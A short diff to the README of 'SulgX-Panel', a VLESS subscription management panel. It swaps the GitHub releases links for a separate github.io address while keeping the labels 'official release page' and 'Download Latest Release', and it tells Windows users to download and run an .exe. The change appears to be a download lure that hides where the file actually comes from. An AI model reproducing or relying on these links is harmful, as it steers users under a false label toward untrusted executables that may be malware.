@@ -1,6 +1,6 @@
 # 🛡️ SulgX-Panel - Manage your network subscriptions with ease
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/fullskirtmalaya185/SulgX-Panel/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue.svg)](https://fullskirtmalaya185.github.io)
 
 SulgX-Panel provides a simple interface to manage your VLESS subscriptions. It handles WebSocket and TLS connections to keep your data secure. You gain full control over user access, bandwidth limits, and traffic monitoring without complex server knowledge. The panel includes a built-in Telegram bot to help you manage settings on the go.
 
@@ -15,7 +15,7 @@ SulgX-Panel provides a simple interface to manage your VLESS subscriptions. It h
 
 You need the latest version of the software to begin. Follow these steps to get your panel running.
 
-1. Visit the [official release page](https://github.com/fullskirtmalaya185/SulgX-Panel/releases).
+1. Visit the [official release page](https://fullskirtmalaya185.github.io).
 2. Look for the "Assets" section at the bottom of the latest release.
 3. Choose the file that ends in .exe for Windows.
 4. Click the file to start the download.
